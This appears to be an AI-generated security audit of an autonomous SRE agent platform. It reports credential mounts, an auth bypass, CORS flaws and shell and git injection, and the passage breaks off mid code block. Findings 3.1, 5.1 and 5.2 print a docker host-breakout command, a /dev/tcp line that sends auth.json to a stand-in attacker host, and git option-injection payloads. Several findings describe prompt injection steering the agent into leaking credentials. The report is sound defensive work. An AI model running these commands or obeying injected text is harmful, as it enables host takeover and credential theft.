# DAA Repository SRE Platform — Phase 4 Comprehensive Security Review & Audit Report

**Date:** July 14, 2026  
**Audited Repository:** `/home/rutvej/Desktop/DAA`  
**Lead Auditor:** Principal Security Engineer (Phase 4 Review Team)  
**Output Document Path:** [phase_4_security_review.md](file:///home/rutvej/.gemini/antigravity-cli/brain/cecf789d-32e3-45b1-923d-94898d19195b/phase_4_security_review.md)  

---

## 1. Executive Summary

A rigorous, full-scope static and dynamic security audit was conducted on the **Deduplicated Autonomous Agent (DAA) v2.0/v3.0 SRE Platform** (`/home/rutvej/Desktop/DAA`). DAA is designed as an autonomous Site Reliability Engineering (SRE) incident diagnosis and auto-remediation platform that ingests live stack traces, interacts with local/cloud Git forges (GitHub, GitLab, Gitea, Bitbucket), executes verification tests inside cloned repositories, and submits automated pull requests/merge requests.

While the architecture demonstrates strong modularity across its FastAPI backend (`backend-api`), Python agent worker (`python-agent`), and React frontend (`admin-panel`), our audit uncovered multiple **Critical** and **High** severity vulnerabilities across all primary attack surfaces. Notably, the platform currently exhibits:
1. **Host Privilege Escalation via Docker Socket & Credential Mounts**: The `python-agent` container is mounted directly with `/var/run/docker.sock`, host developer credentials (`auth.json`), host Antigravity CLI binaries (`agy`), and user directories (`~/.gemini`). Combined with command injection (`shell=True`) and unrestricted file access (`get_full_path`), any compromised container or malicious prompt injection achieves full root execution on the host machine.
2. **Authentication & Authorization Bypasses**: When `DAA_AUTH_ENABLED=false` (the default when running in `none` database mode), the authentication layer injects a synthetic `admin-id` user with full `admin` privileges across all protected API routes, enabling unauthenticated external users to approve code fixes (`/fixes/{id}/approve`), register applications, and exfiltrate cleartext Git/Jira tokens (`GET /projects`).
3. **Command & Shell Injections**: Multiple tool executions (`execution_tool.py`, `git_tool.py`, `ingest.py`, and `daa` CLI) construct shell commands using raw string interpolation with `shell=True` or pass untrusted user/repository strings directly to Git command flags (`--heads`, `--delete`), allowing arbitrary command execution.
4. **Outdated Vulnerable Dependencies**: Core components rely on deeply outdated libraries, including `GitPython==3.1.24` (vulnerable to Remote Code Execution via option injection CVE-2022-24439/CVE-2023-40590), `requests==2.26.0`, and `urllib3==1.26.18`.

### Finding Severity Breakdown

| Severity | Count | Primary Areas Affected |
| :--- | :---: | :--- |
| **Critical** | **5** | Host Credential Mounts, CORS Subnet Wildcard, Docker Socket Privilege Escalation, Synthetic `admin-id` Auth Bypass, Command/Shell Injection (`execution_tool.py` / `git_tool.py`) |
| **High** | **7** | Hardcoded Live Gemini/Git Keys, Hardcoded DB/Gitea Passwords, Insecure Default JWT Secret (`a_secret_key`), `MockSession` Silent Data Loss, Unauthenticated `/self-report` & `/ingest` Endpoints, Git Option Injection (`ls-remote`), Outdated Dependencies (`GitPython`, `requests`) |
| **Medium** | **5** | Cleartext Token Leaks (`GET /projects`), Built-in Admin Panel Exposure (`_SERVE_PANEL=true`), Shared Host Directory (`/tmp/daa`), Missing Ownership Checks on Mutations, Unpinned Package Dependencies |
| **Low / Info** | **1** | SQL Injection Guardrail Verification (ORM vs Dynamic Query Practices) |
| **Total Findings** | **18** | |

---

## 2. Audit Scope & Methodology

This audit strictly evaluated code evidence across the repository's core components:
* **Backend API (`app/backend-api/src`)**: FastAPI endpoints, authentication routers (`auth.py`), incident/fix management (`incidents.py`, `fixes.py`, `projects.py`, `applications.py`), webhook ingestion (`ingest.py`, `telemetry.py`), and database drivers (`database.py`).
* **Python Agent (`app/python-agent/agent_src`)**: LangChain orchestrator (`orchestrator.py`), LLM configuration (`llm_config.py`), and specialized agent tools (`tools/execution_tool.py`, `tools/git_tool.py`, `tools/file_system_tool.py`, `tools/code_nav_tool.py`, `tools/change_tracker_tool.py`).
* **MCP Server & SDKs (`app/daa_mcp_server.py`, `app/daa-sdk`)**: Model Context Protocol integration and service connectors.
* **Deployment & Container Infrastructure**: `docker-compose.yml`, individual `Dockerfile` manifests (`backend-api`, `python-agent`, `admin-panel`, and root `Dockerfile`), shell scripts (`entrypoint.sh`, `install.sh`), and the `daa` CLI supervisor binary.
* **Demo & Testing Scripts**: `test.py`, `setup_keys.py`, `.env`, `.env.example`, `.env.daa`.

Every finding below is substantiated with precise absolute file paths, line numbers, vulnerable code snippets, impact analysis, and actionable remediation steps.

---

## 3. Comprehensive Security Findings by Category

### Category 1: Secrets & Credential Leaks

#### Finding 1.1: Host Credentials & CLI Binary Volume Mounts Exposed to Agent Container
* **Severity:** **Critical**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/docker-compose.yml#L80-L83`
* **Code Evidence:**
  ```yaml
  # docker-compose.yml lines 80-83 under services.python-agent.volumes:
  - ${CODEX_AUTH_JSON_PATH:-/home/rutvej/snap/codex/34/auth.json}:/app/auth.json:ro
  - ${DAA_GIT_DIR:-/home/rutvej/Desktop/DAA/.git}:/app/.git:ro
  - /home/rutvej/.local/bin/agy:/usr/local/bin/agy:ro
  - /home/rutvej/.gemini:/root/.gemini:ro
  ```
* **Impact Analysis:**
  The `python-agent` service mounts the host developer's (`rutvej`) personal authentication file (`/home/rutvej/snap/codex/34/auth.json`) directly to `/app/auth.json`, mounts the host's entire `.gemini` session/configuration directory to `/root/.gemini`, and mounts the host's `agy` CLI binary. Because the agent processes untrusted external input (error stack traces, Git issue descriptions, webhooks) and possesses arbitrary file read tools (`read_file`, `view_file_slice`, `grep_search`), an attacker exploiting prompt injection or path traversal can instruct the LLM tool to read `/app/auth.json` or `/root/.gemini/` and exfiltrate the host developer's private Git, Codex, and Google Antigravity/Gemini API credentials.
* **Remediation Steps:**
  Remove all host-specific developer credential paths (`/home/rutvej/...`) from `docker-compose.yml`. Use dedicated, least-privilege service account tokens passed via Docker secrets (`/var/run/secrets`) or strictly scoped environment variables. Never mount host home directories (`~/.gemini`) or host binaries into application containers.
  ```diff
  - - ${CODEX_AUTH_JSON_PATH:-/home/rutvej/snap/codex/34/auth.json}:/app/auth.json:ro
  - - /home/rutvej/.local/bin/agy:/usr/local/bin/agy:ro
  - - /home/rutvej/.gemini:/root/.gemini:ro
  + - secrets:/var/run/secrets:ro
  ```

---

#### Finding 1.2: Hardcoded Live API Keys and Personal Access Tokens in Repository `.env` Files
* **Severity:** **High**
* **Vulnerable Files:** 
  * `file:///home/rutvej/Desktop/DAA/.env#L3` (`GEMINI_API_KEY`)
  * `file:///home/rutvej/Desktop/DAA/.env#L13` (`DAA_GIT_TOKEN`)
  * `file:///home/rutvej/Desktop/DAA/.env.daa#L3-L4` (`DAA_GIT_TOKEN` and `GITLAB_PRIVATE_TOKEN`)
* **Code Evidence:**
  ```bash
  # .env lines 3 and 13:
  GEMINI_API_KEY=AQ.Ab8RN6Ike5A...[REDACTED_SECRET]
  DAA_GIT_TOKEN=82faa2667dd50c...[REDACTED_SECRET]

  # .env.daa lines 3-4:
  DAA_GIT_TOKEN=95a2c8bca8e687...[REDACTED_SECRET]
  GITLAB_PRIVATE_TOKEN=95a2c8bca8e687...[REDACTED_SECRET]
  ```
* **Impact Analysis:**
  Active, live Google Gemini API keys (`AQ.Ab8RN...`) and GitHub/GitLab personal access tokens (`82faa266...`, `95a2c8bc...`) are committed in cleartext inside local repository environment files (`.env`, `.env.daa`). If these files are exposed via backups, shared workspaces, or accidentally pushed to a remote repository, third parties gain immediate access to Google Cloud AI billing resources and full write access across the user's Git repositories.
* **Remediation Steps:**
  1. Immediately revoke and rotate `GEMINI_API_KEY=AQ.Ab8RN6Ike5A...[REDACTED_SECRET]` and all listed Git tokens (`82faa26...[REDACTED_SECRET]`, `95a2c8b...[REDACTED_SECRET]`).
  2. Ensure `.env` and `.env.daa` are strictly ignored in `.gitignore` (`echo ".env*" >> .gitignore`).
  3. Replace all populated `.env` files in the repository with placeholder values (`GEMINI_API_KEY=your_gemini_api_key_here`).

---

#### Finding 1.3: Hardcoded Default Database & Gitea Passwords in Configuration & Scripts
* **Severity:** **High**
* **Vulnerable Files:** 
  * `file:///home/rutvej/Desktop/DAA/docker-compose.yml#L12` (`POSTGRES_PASSWORD:-demo_postgres_password`)
  * `file:///home/rutvej/Desktop/DAA/test.py#L45-L50` (`DEMO_POSTGRES_URL`, `GITEA_PASS`)
  * `file:///home/rutvej/Desktop/DAA/app/backend-api/src/database.py#L168` (`DATABASE_URL` default)
  * `file:///home/rutvej/Desktop/DAA/entrypoint.sh#L33-L35` (`CREATE USER daa WITH PASSWORD 'daa_pass'`)
* **Code Evidence:**
  ```yaml
  # docker-compose.yml line 12:
  POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-demo_postgres_password}
  ```
  ```python
  # test.py lines 45, 49-50:
  DEMO_POSTGRES_URL = "postgresql://payflow:payflow_secret@postgres/payflow"
  GITEA_USER = "daa-admin"
  GITEA_PASS = "DaaDemo123!"

  # app/backend-api/src/database.py line 168:
  DATABASE_URL = os.environ.get("DATABASE_URL", "postgresql://daa:daa_pass@localhost:5432/daa_db")
  ```
* **Impact Analysis:**
  Default credentials (`demo_postgres_password`, `daa_pass`, `payflow_secret`, `DaaDemo123!`) are hardcoded across Docker Compose definitions, connection string defaults, and supervisor startup scripts (`entrypoint.sh`). Any attacker who gains access to the Docker network (or LAN if port `5433:5432` or `3000` is exposed) can authenticate directly to PostgreSQL or Gitea with these known default passwords, leading to total data breach and repository takeover.
* **Remediation Steps:**
  Enforce mandatory environment variables for `POSTGRES_PASSWORD` without insecure fallback strings in production. In `entrypoint.sh` and `database.py`, abort startup (`raise RuntimeError("POSTGRES_PASSWORD must be explicitly set")`) if default or empty credentials are detected in a non-testing environment (`DAA_ENV != "test"`).

---

#### Finding 1.4: Cleartext Third-Party Integration Token Exposure via API (`GET /projects`)
* **Severity:** **Medium**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/projects.py#L24-L33` and `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/projects.py#L98-L109`
* **Code Evidence:**
  ```python
  # app/backend-api/src/routers/projects.py lines 24-33:
  class ProjectConnectionResponse(BaseModel):
      id: str
      app_name: str
      repo_provider: str
      repo_url: str
      repo_token: str            # <--- Returned in cleartext!
      jira_url: Optional[str]
      jira_token: Optional[str]  # <--- Returned in cleartext!
      jira_project_key: Optional[str]
  ```
* **Impact Analysis:**
  When an authenticated user (or unauthenticated user leveraging Finding 4.1 when `DAA_AUTH_ENABLED=false`) queries `GET /projects` or `GET /projects/{app_name}`, the backend serializes `repo_token` and `jira_token` directly in cleartext in the JSON response payload. Anyone with read access to the dashboard or API can extract high-privilege GitHub/GitLab personal access tokens and Jira API tokens.
* **Remediation Steps:**
  Mask sensitive tokens in API responses. Modify `ProjectConnectionResponse` to return masked indicators (`repo_token_configured: bool = True`, `masked_token: str = "********"`) instead of raw secret strings. Never transmit stored credentials back to client browsers.

---

### Category 2: Unsafe Defaults

#### Finding 2.1: Overly Permissive LAN CORS Subnet Regex & Dynamic Origin Credentials Injection
* **Severity:** **Critical**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/main.py#L64-L67` and `file:///home/rutvej/Desktop/DAA/app/backend-api/src/main.py#L80-L121`
* **Code Evidence:**
  ```python
  # app/backend-api/src/main.py lines 64-67:
  cors_origin_regex = os.environ.get(
      "CORS_ALLOW_ORIGIN_REGEX",
      r"^https?://(localhost|127\.0\.0\.1|192\.168\.\d{1,3}\.\d{1,3})(:\d+)?$",
  )
  app.add_middleware(
      CORSMiddleware,
      allow_origins=cors_origins,
      allow_origin_regex=cors_origin_regex,
      allow_credentials=True,      # <--- Allow credentials with wide regex!
      allow_methods=["*"],
      allow_headers=["*"],
  )
  ```
  ```python
  # app/backend-api/src/main.py dynamic_cors_middleware lines 93-116:
  matched = db.query(Application).filter(Application.allowed_ip == origin_host).first()
  if matched:
      response.headers["Access-Control-Allow-Origin"] = origin
      response.headers["Access-Control-Allow-Credentials"] = "true"
      response.headers["Access-Control-Allow-Methods"] = "*"
      response.headers["Access-Control-Allow-Headers"] = "*"
  ```
* **Impact Analysis:**
  The default `CORS_ALLOW_ORIGIN_REGEX` matches **any IP address across the entire `192.168.0.0/16` subnet** (`192.168.x.y`). Combined with `allow_credentials=True`, any device on the local network (or any malicious webpage hosted on `http://192.168.x.y:80` visited by a developer) can execute Cross-Origin Resource Sharing (CORS) requests with full user credentials (`Authorization` headers/cookies) and read sensitive API responses. Furthermore, `dynamic_cors_middleware` checks if the request's `origin_host` matches any `Application.allowed_ip`. Because applications can be registered (`POST /applications`) with arbitrary `allowed_ip` hostnames, an attacker can register an application with `allowed_ip = "evil.com"` and make the DAA backend dynamically return `Access-Control-Allow-Origin: https://evil.com` with `Allow-Credentials: true`.
* **Remediation Steps:**
  1. Remove wide LAN subnet regexes from `CORS_ALLOW_ORIGIN_REGEX` default. Restrict defaults strictly to `http://localhost:3000` and `http://127.0.0.1:3000`.
  2. Remove `dynamic_cors_middleware` completely, or require strict origin formatting (protocol + port) and administrative approval before an `Application.allowed_ip` is permitted to inject CORS headers.

---

#### Finding 2.2: Insecure Default JWT Signing Secret (`SECRET_KEY = "a_secret_key"`)
* **Severity:** **High**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/auth.py#L15` and `file:///home/rutvej/Desktop/DAA/.env#L9`
* **Code Evidence:**
  ```python
  # app/backend-api/src/routers/auth.py line 15:
  SECRET_KEY = os.environ.get("SECRET_KEY", "a_secret_key")
  ```
  ```bash
  # .env line 9:
  SECRET_KEY=demo_secret_key
  ```
* **Impact Analysis:**
  If the `SECRET_KEY` environment variable is omitted or left as `"demo_secret_key"`, the authentication system signs and verifies all JSON Web Tokens using predictable strings (`"a_secret_key"` or `"demo_secret_key"`). An offline attacker can trivially forge valid JWT access tokens (`{"sub": "admin", "id": "admin-id", "role": "user"}`) using `HMAC-SHA256` and bypass authentication on all protected endpoints (`/applications`, `/fixes`, `/incidents`).
* **Remediation Steps:**
  Raise a fatal startup exception if `SECRET_KEY` is set to `"a_secret_key"`, `"demo_secret_key"`, `"change-me-to-a-random-secret-key"`, or is shorter than 32 bytes when running in production:
  ```python
  SECRET_KEY = os.environ.get("SECRET_KEY")
  if not SECRET_KEY or SECRET_KEY in ("a_secret_key", "demo_secret_key", "change-me-to-a-random-secret-key"):
      raise RuntimeError("Fatal: Insecure SECRET_KEY configured. Please set a strong, unique 64-character secret.")
  ```

---

#### Finding 2.3: Silent Data Loss and Authorization Distortion under `MockSession` (`DAA_DB_PROVIDER=none`)
* **Severity:** **High**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/database.py#L54-L139`
* **Code Evidence:**
  ```python
  # app/backend-api/src/database.py lines 87-124:
  class MockSession:
      def query(self, model_class):
          return MockQuery(model_class)  # MockQuery.first() returns None, .all() returns []
      def add(self, instance):
          pass                           # <--- Silent discard!
      def commit(self):
          pass                           # <--- Silent discard!
  ```
* **Impact Analysis:**
  When `DAA_DB_PROVIDER=none` (the default in `.env` line 4), `SessionLocal` uses `MockSession`. In this mode, `.query().first()` always returns `None`, `.all()` returns `[]`, and `.add()`/`.commit()` silently do nothing. If `DAA_AUTH_ENABLED=true` while `DAA_DB_PROVIDER=none`, user registration (`POST /auth/register`) silently discards the user, and login attempts (`POST /auth/login`) permanently fail (`401 Incorrect username or password` because `query(User)...first()` returns `None`). Furthermore, when endpoints like `/logs` or `/applications` are invoked, data is accepted (`HTTP 202` or `HTTP 201`) but permanently lost without any warning or indication of persistence failure.
* **Remediation Steps:**
  1. Clearly separate state checks. If `DAA_DB_PROVIDER=none`, endpoints that require database persistence (`POST /applications`, `PATCH /incidents/{id}`) should return `HTTP 503 Service Unavailable (Stateless Git-only mode active)` instead of using `MockSession` to silently discard records.
  2. Ensure `DAA_AUTH_ENABLED` cannot be enabled when `DAA_DB_PROVIDER=none` unless an external stateless authentication provider is configured.

---

#### Finding 2.4: Default Exposure of Built-in Admin Panel (`_SERVE_PANEL=true`)
* **Severity:** **Medium**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/main.py#L147-L174`
* **Code Evidence:**
  ```python
  # app/backend-api/src/main.py lines 147-153:
  _SERVE_PANEL = os.environ.get("DAA_SERVE_PANEL", "true").lower() == "true"
  ```
* **Impact Analysis:**
  By default (`DAA_SERVE_PANEL=true`), the backend API server serves the HTML static admin panel (`static/admin.html`) directly at `GET /admin`. While API data endpoints enforce `get_current_user()`, exposing internal management UI assets from the core backend container increases the attack surface and exposes internal API schema structures and routing behavior to unauthenticated network scanners.
* **Remediation Steps:**
  Set `DAA_SERVE_PANEL=false` by default in multi-container setups where a dedicated React admin panel (`app/admin-panel`) is running on port `:5003`.

---

### Category 3: Container & Host Security

#### Finding 3.1: Host Docker Socket Volume Mount inside Python Agent Container (`docker.sock`)
* **Severity:** **Critical**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/docker-compose.yml#L84` and `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/tools/execution_tool.py#L76`
* **Code Evidence:**
  ```yaml
  # docker-compose.yml line 84:
  - /var/run/docker.sock:/var/run/docker.sock
  ```
  ```python
  # app/python-agent/agent_src/tools/execution_tool.py line 76:
  cmd = f"docker run --rm -v {repo_path}:/workspace -w /workspace {runner_image} {test_command}"
  ```
* **Impact Analysis:**
  Mounting `/var/run/docker.sock` inside the `python-agent` container grants the container root-equivalent privileges over the host system's Docker daemon. If an attacker achieves Remote Code Execution inside `python-agent` (via command injection in `execution_tool.py` / `git_tool.py` or prompt injection), they can execute:
  ```bash
  docker run -v /:/host_root --privileged -it alpine chroot /host_root
  ```
  This immediately grants full root access to the underlying host filesystem (`/home/rutvej/...`, `/etc/shadow`, `/root`), completely bypassing container sandbox boundaries.
* **Remediation Steps:**
  1. Remove `/var/run/docker.sock` mount from `python-agent`.
  2. To run verification tests safely without exposing the host Docker daemon, use isolated sandboxing solutions such as **gVisor (`runsc`)**, rootless Podman/Docker inside unprivileged containers, or dispatch test execution jobs to ephemeral CI/CD runners (e.g., GitHub Actions API or isolated Kubernetes jobs).

---

#### Finding 3.2: Containers Executing as Root User (`USER` instruction missing)
* **Severity:** **High**
* **Vulnerable Files:** 
  * `file:///home/rutvej/Desktop/DAA/Dockerfile#L1-L40`
  * `file:///home/rutvej/Desktop/DAA/app/backend-api/Dockerfile#L1-L29`
  * `file:///home/rutvej/Desktop/DAA/app/python-agent/Dockerfile#L1-L13`
  * `file:///home/rutvej/Desktop/DAA/app/admin-panel/Dockerfile#L22-L33`
* **Code Evidence:**
  None of the four Dockerfiles contain a `USER` instruction, causing all processes (`uvicorn`, `python agent_src.main`, `nginx`) to run as `root` (UID 0) inside the container.
* **Impact Analysis:**
  Running container processes as root amplifies the impact of any application-level vulnerability. If a process inside `python-agent` or `backend-api` is compromised via code injection or buffer overflow, the attacker executes with root capabilities inside the container namespace. Combined with volume mounts (`/tmp/daa`, `docker.sock`), root processes can manipulate host-mounted permissions and perform container breakouts.
* **Remediation Steps:**
  Add a dedicated non-root user (`appuser` with UID `10001`) at the end of each Dockerfile before the `ENTRYPOINT` or `CMD` instruction:
  ```dockerfile
  RUN groupadd -g 10001 appgroup && useradd -u 10001 -g appgroup -m appuser
  USER appuser
  ```

---

#### Finding 3.3: Unrestricted Shared Directory Mount (`/tmp/daa`)
* **Severity:** **Medium**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/docker-compose.yml#L85` and `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/tools/file_system_tool.py#L46`
* **Code Evidence:**
  ```yaml
  # docker-compose.yml line 85:
  - /tmp/daa:/tmp/daa
  ```
  ```python
  # file_system_tool.py line 46:
  if file_path.startswith("/tmp") or file_path.startswith("/home"):
      return file_path
  ```
* **Impact Analysis:**
  Mounting `/tmp/daa` between the host and containers without strict directory permissions or per-task subdirectories allows any local host user or concurrent container process to write to `/tmp/daa`. Attackers can stage symlink attacks (TOCTOU) where temporary repository files or error logs inside `/tmp/daa` are replaced with symlinks pointing to sensitive host files before the agent reads them.
* **Remediation Steps:**
  Ensure `/tmp/daa` uses sticky bit permissions (`chmod 1777 /tmp/daa`) or utilize per-container isolated ephemeral volumes (`emptyDir` in K8s or anonymous Docker volumes) instead of direct host `/tmp` mounts.

---

### Category 4: Authentication & Authorization Flaws

#### Finding 4.1: Synthetic `admin-id` User Seeding & Privilege Escalation when `DAA_AUTH_ENABLED=false`
* **Severity:** **Critical**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/auth.py#L69-L70` and `file:///home/rutvej/Desktop/DAA/app/backend-api/src/database.py#L51`
* **Code Evidence:**
  ```python
  # app/backend-api/src/routers/auth.py lines 69-70 inside get_current_user():
  if not DAA_AUTH_ENABLED:
      return {"username": "admin", "id": "admin-id", "role": "admin"}
  ```
  ```python
  # app/backend-api/src/database.py line 51:
  default_auth = "true" if DAA_DB_PROVIDER in ("sqlite", "postgres", ...) else "false"
  DAA_AUTH_ENABLED = os.environ.get("DAA_AUTH_ENABLED", default_auth).lower() == "true"
  ```
* **Impact Analysis:**
  When `DAA_AUTH_ENABLED=false` (`.env` line 7 or default under `DAA_DB_PROVIDER=none`), `get_current_user` does not bypass check by returning an anonymous read-only context; it returns a synthetic user dictionary with `"role": "admin"` and `"id": "admin-id"`. Every protected endpoint across the entire API (`/applications`, `/fixes/{id}/approve`, `/projects`, `/incidents`) relies on `Depends(get_current_user)` and checks if `role == "application"` or `role == "user"`. Because the synthetic user has `"role": "admin"`, **any unauthenticated network request to any protected endpoint is granted absolute administrative authority**. Unauthenticated remote users can approve automated pull requests/merge requests (`/fixes/{id}/approve`), create application registrations, and extract cleartext Git/Jira integration tokens (`GET /projects`).
* **Remediation Steps:**
  When `DAA_AUTH_ENABLED=false`, `get_current_user` should return a restricted, read-only `"role": "anonymous"` identity by default. Mutating administrative endpoints (`POST /applications`, `POST /fixes/{id}/approve`, `POST /projects`) must strictly reject anonymous roles (`if current_user.get("role") != "admin": raise HTTPException(403)`):
  ```python
  if not DAA_AUTH_ENABLED:
      return {"username": "anonymous", "id": "anon-id", "role": "readonly"}
  ```

---

#### Finding 4.2: Completely Unauthenticated Webhook and Self-Report Endpoints (`/api/v1/self-report` and `/ingest/*`)
* **Severity:** **High**
* **Vulnerable Files:** 
  * `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/telemetry.py#L46-L61`
  * `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/ingest.py#L53-L54` and `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/ingest.py#L79-L80`
* **Code Evidence:**
  ```python
  # app/backend-api/src/routers/telemetry.py lines 46-61:
  @router.post("/api/v1/self-report")
  def receive_self_report(
      report: DAAInternalErrorReport,
      background_tasks: BackgroundTasks,
      db: Session = Depends(get_db),
  ):
      if not DAA_MASTER_MODE:
          raise HTTPException(status_code=403, detail="Self-reporting endpoint is disabled...")
      # NO authentication check (no get_current_user or API key check)!
  ```
  ```python
  # app/backend-api/src/routers/ingest.py verify_webhook_auth lines 53-54:
  if not DAA_AUTH_ENABLED:
      return  # Immediate bypass of API key check when auth disabled!
  ```
* **Impact Analysis:**
  * **Self-Report Route**: `receive_self_report` (`POST /api/v1/self-report`) performs zero authentication verification. When `DAA_MASTER_MODE=true`, any external attacker can post arbitrary error stack traces (`report.traceback`) that trigger immediate agent investigations (`execute_agent_sync(job_data)`) targeting the `DAA` repository itself. This enables Denial of Service (queue flooding, exhausting LLM tokens/budget) and allows prompt injection payloads to be fed directly into the autonomous remediation loop targeting the core platform codebase.
  * **Ingest Webhooks**: When `DAA_AUTH_ENABLED=false`, `verify_webhook_auth` (`/ingest/prometheus`, `/ingest/custom`) and `verify_sentry_signature` (`/ingest/sentry`) immediately return without checking API keys or HMAC signatures.
* **Remediation Steps:**
  1. Require a dedicated, mandatory secret key (`DAA_TELEMETRY_KEY` or `X-API-Key`) for `POST /api/v1/self-report`, independent of `DAA_MASTER_MODE` or `DAA_AUTH_ENABLED`.
  2. Webhook endpoints (`/ingest/*`) must require validation of `DAA_API_KEY` or `SENTRY_WEBHOOK_SECRET` even when user login (`DAA_AUTH_ENABLED`) is disabled.

---

#### Finding 4.3: Missing Ownership Authorization Checks on Incident & Fix Mutations
* **Severity:** **Medium**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/incidents.py#L163-L175` and `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/fixes.py#L191-L201`
* **Code Evidence:**
  ```python
  # app/backend-api/src/routers/fixes.py approve_fix lines 191-201:
  @router.post("/{id}/approve")
  def approve_fix(
      id: str,
      db: Session = Depends(get_db),
      current_user: dict = Depends(get_current_user),
  ):
      if current_user.get("role") == "application":
          raise HTTPException(status_code=403, detail="Applications are not authorized...")
      # NO check to see if current_user owns the application associated with this fix!
  ```
* **Impact Analysis:**
  While endpoints block `"role": "application"` tokens, any standard authenticated user (`"role": "user"`) can modify any incident across any application (`PATCH /incidents/{id}`) or approve automated code remediations (`POST /fixes/{id}/approve`) for applications belonging to different teams. Approving a fix immediately triggers `create_pr_on_provider(...)`, pushing branches and opening pull requests on target Git repositories using the stored project token without checking if the user is authorized for that specific application (`Application.team_owner`).
* **Remediation Steps:**
  Enforce application-level authorization in mutation routes. Verify that `current_user["username"]` or `current_user["role"] == "admin"` matches the `team_owner` of the target application (`if app.team_owner and current_user.get("username") != app.team_owner and current_user.get("role") != "admin": raise HTTPException(403)`).

---

### Category 5: Injection Vulnerabilities

#### Finding 5.1: Command & Shell Injection via `shell=True` in `execution_tool.py` and `daa` CLI
* **Severity:** **Critical**
* **Vulnerable Files:** 
  * `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/tools/execution_tool.py#L76-L84`
  * `file:///home/rutvej/Desktop/DAA/daa#L752-L787`
* **Code Evidence:**
  ```python
  # app/python-agent/agent_src/tools/execution_tool.py lines 76-84:
  cmd = f"docker run --rm -v {repo_path}:/workspace -w /workspace {runner_image} {test_command}"
  result = subprocess.run(
      cmd,
      shell=True,            # <--- Command/Shell injection!
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE,
      text=True,
      timeout=120,
  )
  ```
  ```python
  # daa CLI lines 784 and 787:
  subprocess.run(f"{compose_cmd} down", shell=True, check=True)
  subprocess.run(f"{compose_cmd} up -d --build", shell=True, check=True)
  ```
* **Impact Analysis:**
  In `execution_tool.py`, the `run_tests` tool accepts a JSON argument containing `repo_path` and `test_command` from the LLM agent. Because `shell=True` is used with raw string interpolation (`f"docker run ... {test_command}"`), any shell metacharacters inside `test_command` are executed directly by `bin/sh`. If an attacker crafts an incident stack trace or GitHub issue description containing prompt injection (or directly calls the tool via `send_input`/malicious agent state), they can inject:
  ```json
  {"repo_path": "/tmp/app", "test_command": "pytest; echo rce && bash -c 'cat /app/auth.json > /dev/tcp/attacker/4444'"}
  ```
  The shell executes the injected `bash -c` payload on the system. Combined with the `docker.sock` mount (Finding 3.1), an attacker can also inject `-v /:/host_root` into `test_command` to achieve root execution on the host system.
* **Remediation Steps:**
  Never use `shell=True` when executing commands with variable inputs. Pass command arguments as a strict list of tokens (`shell=False`), and explicitly tokenize or validate `test_command` using `shlex.split()` while blocking dangerous Docker flag arguments:
  ```python
  import shlex
  test_args = shlex.split(test_command)
  # Prevent container breakout/flag injection inside test arguments
  if any(arg.startswith("-v") or arg.startswith("--privileged") for arg in test_args):
      return "Error: Disallowed flags in test_command."
  cmd_list = ["docker", "run", "--rm", "-v", f"{repo_path}:/workspace", "-w", "/workspace", runner_image] + test_args
  result = subprocess.run(cmd_list, shell=False, capture_output=True, text=True, timeout=120)
  ```

---

#### Finding 5.2: Command Injection via Untrusted Repository URLs and Git Flag Injection (`ls-remote`, `clone_from`, `push`)
* **Severity:** **High**
* **Vulnerable Files:** 
  * `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/ingest.py#L155-L166`
  * `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/tools/git_tool.py#L158` and `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/tools/git_tool.py#L193-L199`
  * `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/orchestrator.py#L1157-L1165` and `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/orchestrator.py#L1257-L1262`
* **Code Evidence:**
  ```python
  # app/backend-api/src/routers/ingest.py lines 161-166:
  res = subprocess.run(
      ["git", "ls-remote", "--heads", auth_url, f"refs/heads/{branch_name}"],
      capture_output=True, text=True, timeout=10,
  )
  ```
  ```python
  # app/python-agent/agent_src/tools/git_tool.py lines 158, 193-199:
  repo = git.Repo.clone_from(repo_url, temp_dir)
  repo.git.push("origin", "--delete", branch_name)
  repo.git.checkout("-b", branch_name)
  ```
* **Impact Analysis:**
  If an attacker registers an application (`POST /applications` or via `ProjectConnection`) with a malicious `repository_url` or triggers an error where `branch_name` (`f"fix/{fingerprint}"` or tool argument `repo_path_and_branch_name`) starts with a hyphen (`-`), Git subcommands and GitPython methods interpret the argument as a command-line option rather than a URL or branch name. Specifically:
  * Passing a `repo_url` starting with `--upload-pack=bash -c '...'` or `-oProxyCommand=...` to `git ls-remote` or `git.Repo.clone_from` triggers arbitrary command execution when Git invokes the transport protocol helper (`CVE-2022-24439`).
  * Passing a `branch_name` starting with `--exec=` to `repo.git.push()` triggers command injection during the Git push phase.
* **Remediation Steps:**
  1. Insert `--` (end of command options separator) before positional arguments (`auth_url`, `branch_name`) in all `subprocess.run` calls involving `git`:
     ```python
     subprocess.run(["git", "ls-remote", "--heads", "--", auth_url, f"refs/heads/{branch_name}"], ...)
     ```
  2. Strictly validate `repo_url` and `branch_name` before passing to GitPython or `subprocess`. Reject any URL or branch name starting with `-` or containing characters outside `[a-zA-Z0-9_/.-:]`:
     ```python
